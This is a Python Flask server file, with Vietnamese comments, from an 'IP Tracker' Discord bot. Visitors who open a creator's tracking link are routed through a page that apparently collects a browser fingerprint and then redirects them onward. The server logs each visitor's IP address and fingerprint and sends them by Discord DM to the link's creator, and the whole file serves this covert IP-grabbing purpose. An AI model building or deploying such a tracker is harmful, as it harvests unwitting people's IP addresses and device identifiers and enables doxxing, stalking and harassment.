# app/server.py
from flask import Flask, request, render_template, redirect, url_for, abort, jsonify
from threading import Thread
import discord
import os
from . import database as db
import hashlib

# Khởi tạo Flask App
app = Flask(__name__, template_folder='templates')

bot_instance = None 

def set_bot_instance(bot):
    global bot_instance
    bot_instance = bot

async def send_dm_notification(creator_id: int, log_data: dict):
    """
    Hàm bất đồng bộ để gửi tin nhắn DM chứa thông tin log đến người tạo tracker.
    """
    try:
        user = await bot_instance.fetch_user(creator_id)
        if not user:
            print(f"Không thể tìm thấy user với ID: {creator_id}")
            return

        embed = discord.Embed(
            title="🎯 Đã có người truy cập vào link của bạn!",
            description=f"Một truy cập mới vừa được ghi nhận.",
            color=discord.Color.brand_green()
        )
        embed.add_field(name="👤 Visitor ID", value=f"`{log_data['visitor_id']}`", inline=False)
        embed.add_field(name="🌐 Địa chỉ IP", value=f"`{log_data['ip']}`", inline=False)
        
        fingerprint_text = log_data.get('fingerprint', 'Không thể lấy thông tin.')
        if len(fingerprint_text) > 1024:
            fingerprint_text = fingerprint_text[:1020] + "..."

        embed.add_field(name="🔍 Browser Fingerprint", value=f"```\n{fingerprint_text}\n```", inline=False)
        embed.set_footer(text=f"Tracker ID: {log_data['tracker_id']}")
        embed.timestamp = discord.utils.utcnow()

        await user.send(embed=embed)

    except discord.Forbidden:
        print(f"Không thể gửi DM cho {user.name} (ID: {creator_id}). Người dùng đã chặn bot hoặc khóa DM.")
    except Exception as e:
        print(f"Lỗi không xác định khi gửi DM: {e}")


@app.route('/')
def home():
    return "IP Tracker Web Server is alive and running."


@app.route('/track/<tracker_id>')
def track_link(tracker_id: str):
    """
    Endpoint mà người dùng sẽ truy cập.
    """
    tracker = db.get_tracker_by_id(tracker_id)
    if not tracker:
        abort(404, "Link không tồn tại hoặc đã hết hạn.")
    
    return render_template(
        'tracker.html',
        target_url=tracker['target_url'],
        log_url=url_for('log_visit', tracker_id=tracker_id, _external=True)
    )


@app.route('/log/<tracker_id>', methods=['POST'])
def log_visit(tracker_id: str):
    """
    Endpoint này nhận dữ liệu fingerprint từ JS qua request POST.
    """
    # --- [DEBUG LOGS] ---
    print(f"\n--- [DEBUG] Endpoint /log/{tracker_id} ĐÃ ĐƯỢC GỌI. ---")
    
    tracker = db.get_tracker_by_id(tracker_id)
    if not tracker:
        print(f"--- [DEBUG] LỖI: Không tìm thấy tracker_id: {tracker_id} trong DB.")
        return jsonify({"status": "error", "message": "Tracker not found"}), 404
    
    print(f"--- [DEBUG] Đã tìm thấy tracker, người tạo: {tracker['creator_id']}")

    if request.headers.getlist("X-Forwarded-for"): # Thường viết thường 'x-forwarded-for'
        ip = request.headers.getlist("X-Forwarded-for")[0]
    else:
        ip = request.remote_addr
    print(f"--- [DEBUG] IP nhận được: {ip}")

    fingerprint_data = request.json or {}
    print(f"--- [DEBUG] Dữ liệu fingerprint nhận được (visitorId): {fingerprint_data.get('visitorId', 'N/A')}")
    
    print("--- [DEBUG] Đang gọi db.add_log()...")
    db.add_log(tracker_id, ip, fingerprint_data)
    print("--- [DEBUG] ĐÃ GỌI XONG db.add_log() (không có nghĩa là đã thành công, chỉ là đã chạy xong).")
    # --- [END DEBUG LOGS] ---

    if bot_instance:
        # --- [DEBUG LOGS] ---
        print("--- [DEBUG] Bot instance tồn tại. Chuẩn bị yêu cầu gửi DM...")
        # --- [END DEBUG LOGS] ---
        fp_hash_part = fingerprint_data.get('visitorId', 'unknown')
        visitor_hash = hashlib.md5(f"{ip}-{fp_hash_part}".encode()).hexdigest()[:12]

        log_for_dm = {
            "tracker_id": tracker_id,
            "visitor_id": visitor_hash,
            "ip": ip,
            "fingerprint": "\n".join([f"{k}: {v}" for k, v in fingerprint_data.items()])
        }
        
        bot_instance.loop.call_soon_threadsafe(
            bot_instance.loop.create_task, 
            send_dm_notification(tracker['creator_id'], log_for_dm)
        )
        print("--- [DEBUG] Đã yêu cầu bot gửi DM. Kết thúc xử lý endpoint. --- \n")
    else:
        print("--- [DEBUG] LỖI: bot_instance là None! Không thể gửi DM.")

    return jsonify({"status": "ok"})


def run_server():
    """
    Hàm chạy Flask server.
    """
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)


def start_web_server(bot):
    """
    Hàm này được gọi từ main.py để khởi động web server.
    """
    set_bot_instance(bot)
    server_thread = Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    print("🚀 Web Server đã được khởi động.")
